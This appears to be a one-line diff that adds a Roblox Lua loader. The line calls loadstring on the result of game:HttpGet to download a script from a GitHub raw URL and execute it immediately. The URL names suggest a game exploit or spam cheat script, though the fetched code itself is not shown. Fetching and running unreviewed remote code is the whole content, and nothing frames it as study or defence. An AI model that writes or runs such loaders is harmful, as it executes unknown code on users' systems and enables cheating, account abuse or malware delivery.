@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/update-illegal-soccer-spam2-pww7tnmkmcdppt.lua"))()
